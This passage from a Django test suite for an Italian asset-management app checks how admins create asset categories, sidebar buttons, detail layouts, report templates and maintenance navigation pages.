        self.assertEqual(response.status_code, 302)
        self.assertEqual(response["Location"], f"{reverse('assets:gestione_admin')}?tab=categorie")
        self.assertTrue(
            AssetCategoryField.objects.filter(
                category=category,
                label="NVR principale",
            ).exists()
        )

    def test_gestione_admin_can_create_sidebar_button_for_asset_category(self):
        AssetSidebarButton.objects.all().delete()
        category = AssetCategory.objects.create(
            code="tvcc",
            label="TVCC",
            base_asset_type=Asset.TYPE_CCTV,
            is_active=True,
        )
        request = self.factory.post(
            reverse("assets:gestione_admin"),
            {
                "action": "create_sidebar_button_for_category",
                "category_id": str(category.id),
                "sidebar_label": "TVCC impianti",
                "section": AssetSidebarButton.SECTION_MAIN,
                "sort_order": "90",
            },
        )
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

        self.assertEqual(response.status_code, 302)
        self.assertEqual(response["Location"], f"{reverse('assets:gestione_admin')}?tab=categorie")
        self.assertTrue(AssetSidebarButton.objects.filter(code="dashboard").exists())
        sidebar_item = AssetSidebarButton.objects.get(label="TVCC impianti")
        self.assertEqual(
            sidebar_item.target_url,
            f"django:assets:asset_list?asset_category={category.id}&rows={{rows}}",
        )
        self.assertEqual(sidebar_item.active_match, f"asset_category={category.id}")

    def test_asset_list_filters_by_asset_category(self):
        category = AssetCategory.objects.create(
            code="allarmi",
            label="Allarmi",
            base_asset_type=Asset.TYPE_OTHER,
            is_active=True,
        )
        other_category = AssetCategory.objects.create(
            code="tvcc",
            label="TVCC",
            base_asset_type=Asset.TYPE_CCTV,
            is_active=True,
        )
        Asset.objects.create(
            asset_tag="ALM-100",
            name="Centrale allarme",
            asset_type=Asset.TYPE_OTHER,
            asset_category=category,
        )
        Asset.objects.create(
            asset_tag="CAM-100",
            name="Telecamera ingresso",
            asset_type=Asset.TYPE_CCTV,
            asset_category=other_category,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_list"), {"asset_category": category.id})

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Centrale allarme")
        self.assertContains(response, "Allarmi (1)")
        self.assertNotContains(response, "Telecamera ingresso")

    def test_gestione_admin_can_seed_sidebar_buttons(self):
        AssetSidebarButton.objects.all().delete()

        request = self.factory.post(
            reverse("assets:gestione_admin"),
            {
                "action": "seed_sidebar_buttons",
            },
        )
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

        self.assertEqual(response.status_code, 302)
        self.assertTrue(AssetSidebarButton.objects.filter(code="dashboard").exists())
        self.assertTrue(AssetSidebarButton.objects.filter(code="software_licenses").exists())

    def test_sidebar_input_suggestions_include_routes_and_filters(self):
        target_suggestions, active_match_suggestions = asset_views._sidebar_input_suggestions()

        target_values = {row["value"] for row in target_suggestions}
        active_values = {row["value"] for row in active_match_suggestions}

        self.assertIn("django:assets:reports", target_values)
        self.assertIn("django:assets:asset_list?asset_type=SERVER&rows={rows}", target_values)
        self.assertIn("/assets/reports/", active_values)
        self.assertIn("asset_type=SERVER", active_values)
        self.assertIn("reparto=", active_values)

    def test_gestione_admin_can_delete_non_default_label_template(self):
        template = AssetLabelTemplate.objects.create(
            asset_type=Asset.TYPE_WORK_MACHINE,
            name="Template da eliminare",
        )
        request = self.factory.post(
            reverse("assets:gestione_admin"),
            {
                "action": "delete_label_template",
                "template_id": str(template.id),
            },
        )
        _attach_session(request)
        request.user = self.user
        request.legacy_user = None
        setattr(request, "_messages", FallbackStorage(request))

        response = asset_views.gestione_admin.__wrapped__(request)

        self.assertEqual(response.status_code, 302)
        self.assertFalse(AssetLabelTemplate.objects.filter(pk=template.pk).exists())

    def test_asset_edit_redirects_to_work_machine_edit_for_work_machine(self):
        asset = Asset.objects.create(
            name="Pressa officina",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CQF",
            source_key="manual-wm-test-redirect",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-test-redirect")
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_edit", kwargs={"id": asset.id}))
        self.assertRedirects(response, reverse("assets:work_machine_edit", kwargs={"id": asset.id}))

    def test_work_machine_dashboard_shows_overdue_reminder(self):
        asset = Asset.objects.create(
            name="Fresa produzione",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CNC",
            source_key="manual-wm-overdue",
        )
        WorkMachine.objects.create(
            asset=asset,
            source_key="manual-wm-overdue",
            next_maintenance_date=timezone.localdate() - timedelta(days=2),
            maintenance_reminder_days=7,
        )
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:work_machine_dashboard"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Scaduta da 2 gg")

    def test_superuser_can_create_list_option(self):
        admin = User.objects.create_superuser(username="asset-lists-admin", email="asset-lists@test.local", password="pass12345")
        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_list"),
            {
                "action": "create_list_option",
                "field_key": "reparto",
                "value": "CQF",
                "sort_order": "10",
                "is_active": "1",
            },
        )
        self.assertEqual(response.status_code, 302)
        self.assertTrue(AssetListOption.objects.filter(field_key="reparto", value="CQF").exists())

    def test_superuser_can_create_action_button(self):
        admin = User.objects.create_superuser(
            username="asset-buttons-admin",
            email="asset-buttons@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_list"),
            {
                "action": "create_action_button",
                "label": "Apri scheda",
                "zone": "HEADER",
                "action_type": "LINK",
                "target": "/assets/view/{asset_id}/",
                "style": "PRIMARY",
                "sort_order": "10",
                "is_active": "1",
            },
        )
        self.assertEqual(response.status_code, 302)
        self.assertTrue(AssetActionButton.objects.filter(label="Apri scheda", zone="HEADER").exists())

    def test_non_admin_cannot_export_admin_snapshot(self):
        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:asset_list"),
            {"action": "export_admin_snapshot"},
        )
        self.assertEqual(response.status_code, 302)

    def test_superuser_can_export_admin_snapshot(self):
        admin = User.objects.create_superuser(
            username="asset-export-admin",
            email="asset-export@test.local",
            password="pass12345",
        )
        AssetCustomField.objects.create(code="rack", label="Rack", field_type="TEXT", is_active=True)
        AssetListOption.objects.create(field_key="reparto", value="IT", sort_order=10, is_active=True)
        AssetActionButton.objects.create(
            code="asset-detail",
            label="Vai dettaglio",
            zone=AssetActionButton.ZONE_HEADER,
            action_type=AssetActionButton.TYPE_LINK,
            target="/assets/view/{asset_id}/",
            style=AssetActionButton.STYLE_PRIMARY,
            sort_order=10,
            is_active=True,
        )
        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_list"),
            {"action": "export_admin_snapshot"},
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response["Content-Type"].startswith("application/json"))
        payload = json.loads(response.content.decode("utf-8"))
        self.assertIn("asset_categories", payload)
        self.assertIn("asset_category_fields", payload)
        self.assertIn("custom_fields", payload)
        self.assertIn("list_options", payload)
        self.assertIn("action_buttons", payload)
        self.assertIn("detail_fields", payload)
        self.assertIn("sidebar_buttons", payload)
        self.assertEqual(payload["custom_fields"][0]["label"], "Rack")

    def test_admin_can_create_asset_category(self):
        admin = User.objects.create_superuser(
            username="asset-category-admin",
            email="asset-category@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_list"),
            {
                "action": "create_asset_category",
                "label": "Sistema allarme",
                "base_asset_type": Asset.TYPE_OTHER,
                "description": "Impianti antintrusione",
                "detail_specs_title": "Dati impianto",
                "detail_profile_title": "Profilo allarme",
                "sort_order": "20",
                "is_active": "1",
            },
        )

        self.assertEqual(response.status_code, 302)
        self.assertTrue(
            AssetCategory.objects.filter(
                label="Sistema allarme",
                base_asset_type=Asset.TYPE_OTHER,
                detail_specs_title="Dati impianto",
            ).exists()
        )

    def test_asset_create_saves_category_specific_field_values(self):
        category = AssetCategory.objects.create(
            code="sistema-allarme",
            label="Sistema allarme",
            base_asset_type=Asset.TYPE_OTHER,
            is_active=True,
        )
        category_field = AssetCategoryField.objects.create(
            category=category,
            code="matricola_centrale",
            label="Matricola centrale",
            field_type=AssetCategoryField.TYPE_TEXT,
            detail_section=AssetDetailField.SECTION_SPECS,
            detail_value_format=AssetDetailField.FORMAT_TEXT,
            is_required=True,
            show_in_form=True,
            show_in_detail=True,
            is_active=True,
        )

        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:asset_create"),
            {
                "asset_tag": "",
                "name": "Centrale reparto 1",
                "asset_category": str(category.id),
                "asset_type": Asset.TYPE_HW,
                "reparto": "SIC",
                "manufacturer": "Ajax",
                "model": "Hub",
                "serial_number": "",
                "status": Asset.STATUS_IN_USE,
                "assignment_to": "",
                "assignment_reparto": "",
                "assignment_location": "",
                "notes": "",
                f"category__{category_field.code}": "ALM-001",
            },
        )

        self.assertEqual(response.status_code, 302)
        asset = Asset.objects.get(name="Centrale reparto 1")
        self.assertEqual(asset.asset_category, category)
        self.assertEqual(asset.asset_type, Asset.TYPE_OTHER)
        self.assertEqual(asset.extra_columns.get("_category_fields", {}).get("matricola_centrale"), "ALM-001")

    def test_asset_detail_uses_category_titles_and_category_field_values(self):
        category = AssetCategory.objects.create(
            code="pompa-di-calore",
            label="Pompa di calore",
            base_asset_type=Asset.TYPE_OTHER,
            detail_specs_title="Scheda impianto",
            detail_profile_title="Profilo macchina termica",
            detail_assignment_title="Referente impianto",
            detail_timeline_title="Storico impianto",
            detail_maintenance_title="Registro manutenzione termica",
            is_active=True,
        )
        AssetCategoryField.objects.create(
            category=category,
            code="potenza_kw",
            label="Potenza",
            field_type=AssetCategoryField.TYPE_NUMBER,
            detail_section=AssetDetailField.SECTION_SPECS,
            detail_value_format=AssetDetailField.FORMAT_TEXT,
            show_in_form=True,
            show_in_detail=True,
            is_active=True,
        )
        asset = Asset.objects.create(
            asset_tag="AST-CAT-001",
            name="Pompa di calore uffici",
            asset_type=Asset.TYPE_OTHER,
            asset_category=category,
            extra_columns={"_category_fields": {"potenza_kw": "18"}},
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Pompa di calore")
        self.assertContains(response, "Scheda impianto")
        self.assertContains(response, "Profilo macchina termica")
        self.assertContains(response, "Referente impianto")
        self.assertContains(response, "Storico impianto")
        self.assertContains(response, "Registro manutenzione termica")
        self.assertContains(response, "Potenza")
        self.assertContains(response, "18")

    def test_asset_detail_specs_hide_empty_standard_fallback_rows(self):
        AssetDetailField.objects.all().delete()
        asset = Asset.objects.create(
            asset_tag="AST-SPECS-001",
            name="Notebook specifiche parziali",
            asset_type=Asset.TYPE_HW,
            serial_number="SN-SPECS-001",
        )
        AssetITDetails.objects.create(asset=asset)

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Numero seriale")
        self.assertContains(response, "SN-SPECS-001")
        self.assertNotContains(response, '<span class="af-spec-k">Processore</span>', html=False)
        self.assertNotContains(response, '<span class="af-spec-k">Memoria</span>', html=False)
        self.assertNotContains(response, '<span class="af-spec-k">Sistema operativo</span>', html=False)
        self.assertNotContains(response, '<span class="af-spec-k">Grafica</span>', html=False)

    def test_asset_detail_specs_hide_empty_category_fields_even_when_show_if_empty(self):
        category = AssetCategory.objects.create(
            code="quadro-elettrico",
            label="Quadro elettrico",
            base_asset_type=Asset.TYPE_OTHER,
            is_active=True,
        )
        AssetCategoryField.objects.create(
            category=category,
            code="matricola_quadro",
            label="Matricola quadro",
            field_type=AssetCategoryField.TYPE_TEXT,
            detail_section=AssetDetailField.SECTION_SPECS,
            detail_value_format=AssetDetailField.FORMAT_TEXT,
            show_in_detail=True,
            is_active=True,
        )
        AssetCategoryField.objects.create(
            category=category,
            code="campo_non_compilato",
            label="Campo non compilato",
            field_type=AssetCategoryField.TYPE_TEXT,
            detail_section=AssetDetailField.SECTION_SPECS,
            detail_value_format=AssetDetailField.FORMAT_TEXT,
            show_in_detail=True,
            show_if_empty=True,
            is_active=True,
        )
        asset = Asset.objects.create(
            asset_tag="AST-SPECS-002",
            name="Quadro reparto 2",
            asset_type=Asset.TYPE_OTHER,
            asset_category=category,
            extra_columns={"_category_fields": {"matricola_quadro": "QE-002", "campo_non_compilato": ""}},
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Matricola quadro")
        self.assertContains(response, "QE-002")
        self.assertNotContains(response, "Campo non compilato")

    def test_asset_detail_specs_render_false_boolean_as_no(self):
        category = AssetCategory.objects.create(
            code="impianto-antincendio",
            label="Impianto antincendio",
            base_asset_type=Asset.TYPE_OTHER,
            is_active=True,
        )
        AssetCategoryField.objects.create(
            category=category,
            code="presidio_attivo",
            label="Presidio attivo",
            field_type=AssetCategoryField.TYPE_BOOL,
            detail_section=AssetDetailField.SECTION_SPECS,
            detail_value_format=AssetDetailField.FORMAT_BOOL,
            show_in_detail=True,
            is_active=True,
        )
        asset = Asset.objects.create(
            asset_tag="AST-SPECS-003",
            name="Presidio magazzino",
            asset_type=Asset.TYPE_OTHER,
            asset_category=category,
            extra_columns={"_category_fields": {"presidio_attivo": False}},
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Presidio attivo")
        self.assertContains(response, '<span class="af-spec-v">No</span>', html=False)

    def test_asset_detail_specs_card_not_rendered_when_configured_specs_are_empty(self):
        AssetDetailField.objects.all().delete()
        asset = Asset.objects.create(
            asset_tag="AST-SPECS-004",
            name="Asset senza specifiche",
            asset_type=Asset.TYPE_OTHER,
        )
        AssetDetailField.objects.create(
            code="empty-spec-model",
            label="Modello vuoto",
            section=AssetDetailField.SECTION_SPECS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="asset:model",
            value_format=AssetDetailField.FORMAT_TEXT,
            show_if_empty=True,
            is_active=True,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertNotContains(response, 'data-card-code="specs"', html=False)
        self.assertNotContains(response, "Modello vuoto")

    def test_admin_can_create_sidebar_child_button(self):
        admin = User.objects.create_superuser(
            username="asset-sidebar-admin",
            email="asset-sidebar@test.local",
            password="pass12345",
        )
        parent = AssetSidebarButton.objects.create(
            code="impianti",
            section=AssetSidebarButton.SECTION_MAIN,
            label="Impianti",
            target_url="django:assets:plant_layout_map",
            sort_order=10,
            is_visible=True,
        )

        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_list"),
            {
                "action": "create_sidebar_button",
                "label": "TVCC",
                "section": AssetSidebarButton.SECTION_ANALYTICS,
                "parent_sidebar_button_id": str(parent.id),
                "target_url": "django:assets:plant_layout_map?category=TVCC",
                "sort_order": "20",
                "is_visible": "1",
            },
        )

        self.assertEqual(response.status_code, 302)
        child = AssetSidebarButton.objects.get(label="TVCC", parent=parent)
        self.assertEqual(child.parent, parent)
        self.assertTrue(child.is_subitem)
        self.assertEqual(child.section, parent.section)

    def test_admin_can_create_asset_detail_field(self):
        admin = User.objects.create_superuser(
            username="asset-detail-admin",
            email="asset-detail@test.local",
            password="pass12345",
        )

        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_list"),
            {
                "action": "create_detail_field",
                "label": "Centro di costo",
                "section": AssetDetailField.SECTION_SPECS,
                "asset_scope": AssetDetailField.SCOPE_ALL,
                "source_ref": "custom:centro_di_costo",
                "value_format": AssetDetailField.FORMAT_TEXT,
                "sort_order": "90",
                "is_active": "1",
            },
        )

        self.assertEqual(response.status_code, 302)
        self.assertTrue(
            AssetDetailField.objects.filter(
                label="Centro di costo",
                section=AssetDetailField.SECTION_SPECS,
                source_ref="custom:centro_di_costo",
            ).exists()
        )

    def test_asset_detail_can_render_configured_custom_detail_field(self):
        asset = Asset.objects.create(
            asset_tag="AST-DETAIL-001",
            name="Asset con dettaglio custom",
            asset_type=Asset.TYPE_OTHER,
            extra_columns={"centro_di_costo": "Produzione Nord"},
        )
        AssetCustomField.objects.create(
            code="centro_di_costo",
            label="Centro di costo",
            field_type=AssetCustomField.TYPE_TEXT,
            is_active=True,
        )
        AssetDetailField.objects.create(
            code="spec-centro-di-costo",
            label="Centro di costo",
            section=AssetDetailField.SECTION_SPECS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="custom:centro_di_costo",
            value_format=AssetDetailField.FORMAT_TEXT,
            sort_order=10,
            is_active=True,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Centro di costo")
        self.assertContains(response, "Produzione Nord")

    def test_asset_detail_shows_linked_closed_ticket(self):
        asset = Asset.objects.create(
            asset_tag="PCLBOVA",
            name="Notebook Luca Bova",
            asset_type=Asset.TYPE_HW,
        )
        ticket = Ticket.objects.create(
            tipo=TipoTicket.IT,
            titolo="Notebook non si avvia",
            descrizione="Il PC resta bloccato all'avvio.",
            categoria="PC",
            priorita=PrioritaTicket.MEDIA,
            stato=StatoTicket.CHIUSO,
            asset=asset,
            richiedente_nome=self.user.get_username(),
            richiedente_email="asset-user@test.local",
            closed_at=timezone.now(),
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Ticket collegati")
        self.assertContains(response, ticket.numero_ticket)
        self.assertContains(response, "Notebook non si avvia")
        self.assertContains(response, "Chiuso")
        self.assertContains(response, reverse("tickets:detail", kwargs={"pk": ticket.pk}))

    def test_superuser_can_access_asset_detail_layout_admin_page(self):
        admin = User.objects.create_superuser(
            username="asset-layout-admin",
            email="asset-layout@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)

        response = self.client.get(reverse("assets:asset_detail_layout_admin"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Configura dettaglio asset")
        self.assertContains(response, "Riquadri fissi")

    def test_superuser_can_access_report_template_admin_page(self):
        admin = User.objects.create_superuser(
            username="asset-report-admin-page",
            email="asset-report-admin-page@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)

        response = self.client.get(reverse("assets:report_template_admin"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Gestione template report")
        self.assertContains(response, "Nuovo template")
        self.assertContains(response, "Report gestiti")
        self.assertContains(response, 'class="rta-form-stack"', html=False)
        self.assertContains(response, 'class="rta-card is-form"', html=False)
        self.assertContains(response, 'aria-label="Form report"', html=False)
        self.assertContains(response, "max-width: 1180px", html=False)
        self.assertContains(response, "width: min(100%, 920px)", html=False)

    def test_maintenance_pages_share_section_navigation(self):
        admin = User.objects.create_superuser(
            username="asset-section-nav-admin",
            email="asset-section-nav@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)

        hub_response = self.client.get(reverse("assets:maintenance_hub"))
        self.assertEqual(hub_response.status_code, 200)
        self.assertContains(hub_response, 'class="as-section-nav"', html=False)
        self.assertContains(hub_response, 'aria-label="Manutenzione"', html=False)
        self.assertContains(hub_response, ">Assets<", html=False)
        self.assertContains(hub_response, ">Manutenzione<", html=False)
        self.assertContains(
            hub_response,
            f'class="as-section-tab active" href="{reverse("assets:maintenance_hub")}" aria-current="page">Oggi</a>',
            html=False,
        )
        self.assertContains(hub_response, f'href="{reverse("assets:maintenance_schedule")}">Scadenzario</a>', html=False)
        self.assertContains(hub_response, f'href="{reverse("assets:wo_list")}">Interventi</a>', html=False)
        self.assertContains(hub_response, f'href="{reverse("assets:maintenance_history")}">Storico</a>', html=False)
        self.assertContains(hub_response, f'href="{reverse("assets:maintenance_impostazioni")}">Catalogo e piani</a>', html=False)
        self.assertContains(
            hub_response,
            f'class="as-section-action as-section-action--primary" href="{reverse("assets:wo_list")}?create=1" data-as-section-action="new-workorder">+ Nuovo intervento</a>',
            html=False,
        )
        self.assertContains(
            hub_response,
            f'href="{reverse("assets:wo_list")}?export=1" data-as-section-action="export-workorders">Esporta OdL</a>',
            html=False,
        )
        self.assertContains(
            hub_response,
            f'href="{reverse("assets:maintenance_rule_create")}" data-as-section-action="new-plan">+ Nuovo piano</a>',
            html=False,
        )

        schedule_response = self.client.get(reverse("assets:maintenance_schedule"))
        self.assertEqual(schedule_response.status_code, 200)
        self.assertContains(
            schedule_response,
            f'class="as-section-tab active" href="{reverse("assets:maintenance_schedule")}" aria-current="page">Scadenzario</a>',
            html=False,
        )

        workorders_response = self.client.get(reverse("assets:wo_list"))
        self.assertEqual(workorders_response.status_code, 200)
        self.assertContains(
            workorders_response,
            f'class="as-section-tab active" href="{reverse("assets:wo_list")}" aria-current="page">Interventi</a>',
            html=False,
        )
        self.assertContains(workorders_response, 'params.get("create") === "1"', html=False)
        self.assertContains(workorders_response, 'openDialog("woCreateDlg")', html=False)
        self.assertContains(workorders_response, 'params.get("export") === "1"', html=False)
        self.assertContains(workorders_response, 'openDialog("woExportDlg")', html=False)

        report_templates_response = self.client.get(reverse("assets:report_template_admin"))
        self.assertEqual(report_templates_response.status_code, 200)
        self.assertContains(
            report_templates_response,
            f'class="as-section-tab active" href="{reverse("assets:reports")}?scope=production" aria-current="page">Report</a>',
            html=False,
        )

    def test_maintenance_hub_has_one_clear_operational_hierarchy(self):
        admin = User.objects.create_superuser(
            username="asset-maintenance-ux-admin",
            email="asset-maintenance-ux@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)

        response = self.client.get(reverse("assets:maintenance_hub"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(
            response,
            '<section class="mh-priority-strip" aria-label="Priorità manutenzione">',
            html=False,
        )
        self.assertContains(response, "Lavoro operativo")
        self.assertContains(response, "Interventi da gestire")
        self.assertContains(response, "Agenda 7 giorni")
        self.assertContains(response, "Apri il registro completo")
        self.assertContains(response, "Centro manutenzione aziendale")
        self.assertContains(response, "Piani ordinari")
        self.assertContains(response, "Catalogo attivita")
        self.assertContains(response, "Storico")
        expected_create_url = f'{reverse("assets:wo_list")}?create=1'
        self.assertEqual(response.context["url_wo_create"], expected_create_url)
        self.assertContains(
            response,
            f'href="{expected_create_url}">+ Nuovo intervento</a>',
            html=False,
        )
        self.assertNotContains(response, '<section class="oc-cockpit"', html=False)
        self.assertNotContains(response, '<div class="mh-actions-list">', html=False)
        self.assertNotContains(response, "Mese corrente")

    def test_superuser_can_create_custom_report_definition(self):
        admin = User.objects.create_superuser(
            username="asset-report-definition-admin",
            email="asset-report-definition@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)

        response = self.client.post(
            reverse("assets:report_template_admin"),
            {
                "action": "create_report_definition",
                "code": "asset-collaudo",
                "label": "Report collaudo asset",
                "description": "Report tecnico di collaudo",
                "sort_order": "30",
            },
        )

        self.assertEqual(response.status_code, 302)
        definition = AssetReportDefinition.objects.get(code="asset-collaudo")
        self.assertEqual(definition.label, "Report collaudo asset")

    def test_superuser_can_upload_report_template(self):
        admin = User.objects.create_superuser(
            username="asset-report-template-admin",
            email="asset-report-template@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)
        upload = SimpleUploadedFile(
            "scheda_asset.docx",
            b"fake-docx-template",
            content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        )

        with _workspace_temporary_directory("assets-report-template-") as media_root, override_settings(MEDIA_ROOT=media_root):
            response = self.client.post(
                reverse("assets:report_template_admin"),
                {
                    "action": "upload_report_template",
                    "report_code": AssetReportTemplate.REPORT_ASSET_DETAIL,
                    "name": "Scheda asset standard",
                    "version": "v1",
                    "description": "Template base per report asset",
                    "is_active": "1",
                    "template_file": upload,
                },
            )

            self.assertEqual(response.status_code, 302)
            template = AssetReportTemplate.objects.get(report_code=AssetReportTemplate.REPORT_ASSET_DETAIL)
            self.assertEqual(template.name, "Scheda asset standard")
            self.assertTrue(template.is_active)
            self.assertTrue(Path(template.file.path).exists())

    def test_superuser_can_upload_report_template_for_custom_report(self):
        admin = User.objects.create_superuser(
            username="asset-report-template-custom-admin",
            email="asset-report-template-custom@test.local",
            password="pass12345",
        )
        AssetReportDefinition.objects.create(
            code="asset-collaudo",
            label="Report collaudo asset",
            description="Report tecnico di collaudo",
            sort_order=30,
        )
        self.client.force_login(admin)
        upload = SimpleUploadedFile(
            "collaudo.xlsx",
            b"fake-xlsx-template",
            content_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        )

        with _workspace_temporary_directory("assets-report-template-custom-") as media_root, override_settings(MEDIA_ROOT=media_root):
            response = self.client.post(
                reverse("assets:report_template_admin"),
                {
                    "action": "upload_report_template",
                    "report_code": "asset-collaudo",
                    "name": "Template collaudo",
                    "version": "v2",
                    "description": "Formato officina",
                    "is_active": "1",
                    "template_file": upload,
                },
            )

            self.assertEqual(response.status_code, 302)
            template = AssetReportTemplate.objects.get(report_code="asset-collaudo")
            self.assertEqual(template.name, "Template collaudo")

    def test_delegated_user_can_access_asset_detail_layout_admin_page(self):
        self.client.force_login(self.user)
        with patch("assets.views.user_can_modulo_action", return_value=True):
            response = self.client.get(reverse("assets:asset_detail_layout_admin"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Campi categoria")

    def test_asset_detail_layout_admin_shows_bulk_controls_for_fixed_sections(self):
        admin = User.objects.create_superuser(
            username="asset-layout-bulk-ui-admin",
            email="asset-layout-bulk-ui@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)

        response = self.client.get(reverse("assets:asset_detail_layout_admin"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Modifica massiva")
        self.assertContains(response, "Applica parametro")
        self.assertContains(response, 'name="selected_layout_ids"', html=False)

    def test_asset_detail_layout_admin_can_move_fixed_sections(self):
        admin = User.objects.create_superuser(
            username="asset-layout-move-admin",
            email="asset-layout-move@test.local",
            password="pass12345",
        )
        asset_views._ensure_default_asset_detail_section_layouts()
        self.client.force_login(admin)

        timeline_layout = AssetDetailSectionLayout.objects.get(code=AssetDetailSectionLayout.SECTION_TIMELINE)
        response = self.client.post(
            reverse("assets:asset_detail_layout_admin"),
            {
                "action": "move_detail_section_layout",
                "layout_id": str(timeline_layout.id),
                "direction": "up",
            },
        )

        self.assertEqual(response.status_code, 302)
        ordered_codes = list(
            AssetDetailSectionLayout.objects.order_by("sort_order", "id").values_list("code", flat=True)
        )
        self.assertEqual(
            ordered_codes[:3],
            [
                AssetDetailSectionLayout.SECTION_TIMELINE,
                AssetDetailSectionLayout.SECTION_SPECS,
                AssetDetailSectionLayout.SECTION_MAINTENANCE,
            ],
        )

    def test_asset_detail_layout_admin_can_apply_bulk_size_to_all_sections(self):
        admin = User.objects.create_superuser(
            username="asset-layout-bulk-size-admin",
            email="asset-layout-bulk-size@test.local",
            password="pass12345",
        )
        asset_views._ensure_default_asset_detail_section_layouts()
        self.client.force_login(admin)

        response = self.client.post(
            reverse("assets:asset_detail_layout_admin"),
            {
                "action": "update_detail_section_layout_bulk",
                "bulk_field": "grid_size",
                "bulk_grid_size": AssetDetailSectionLayout.SIZE_FULL,
                "apply_scope": "all",
            },
        )

        self.assertEqual(response.status_code, 302)
        self.assertFalse(
            AssetDetailSectionLayout.objects.exclude(grid_size=AssetDetailSectionLayout.SIZE_FULL).exists()
        )

    def test_asset_detail_layout_admin_can_apply_bulk_visibility_to_selected_sections(self):
        admin = User.objects.create_superuser(
            username="asset-layout-bulk-visible-admin",
            email="asset-layout-bulk-visible@test.local",
            password="pass12345",
        )
        section_layouts = asset_views._ensure_default_asset_detail_section_layouts()
        AssetDetailSectionLayout.objects.update(is_visible=True)
        selected_ids = [section_layouts[0].id, section_layouts[1].id]
        untouched_id = section_layouts[2].id
        self.client.force_login(admin)

        response = self.client.post(
            reverse("assets:asset_detail_layout_admin"),
            {
                "action": "update_detail_section_layout_bulk",
                "bulk_field": "is_visible",
                "bulk_is_visible": "hidden",
                "apply_scope": "selected",
                "selected_layout_ids": [str(row_id) for row_id in selected_ids],
            },
        )

        self.assertEqual(response.status_code, 302)
        hidden_rows = set(
            AssetDetailSectionLayout.objects.filter(is_visible=False).values_list("id", flat=True)
        )
        self.assertEqual(hidden_rows, set(selected_ids))
        self.assertTrue(AssetDetailSectionLayout.objects.get(pk=untouched_id).is_visible)

    def test_asset_detail_layout_admin_shows_bulk_controls_for_detail_fields(self):
        admin = User.objects.create_superuser(
            username="asset-layout-detail-bulk-ui-admin",
            email="asset-layout-detail-bulk-ui@test.local",
            password="pass12345",
        )
        AssetDetailField.objects.create(
            code="bulk-ui-detail-field",
            label="Seriale",
            section=AssetDetailField.SECTION_SPECS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="asset:serial_number",
            value_format=AssetDetailField.FORMAT_TEXT,
            card_size=AssetDetailField.CARD_THIRD,
            sort_order=10,
            is_active=True,
        )
        self.client.force_login(admin)

        response = self.client.get(reverse("assets:asset_detail_layout_admin"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Modifica massiva campi")
        self.assertContains(response, 'value="update_detail_field_bulk"', html=False)
        self.assertContains(response, 'name="selected_detail_field_ids"', html=False)

    def test_asset_detail_layout_admin_can_apply_bulk_card_size_to_all_detail_fields(self):
        admin = User.objects.create_superuser(
            username="asset-layout-detail-bulk-size-admin",
            email="asset-layout-detail-bulk-size@test.local",
            password="pass12345",
        )
        field_a = AssetDetailField.objects.create(
            code="bulk-size-field-a",
            label="Produttore",
            section=AssetDetailField.SECTION_SPECS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="asset:manufacturer",
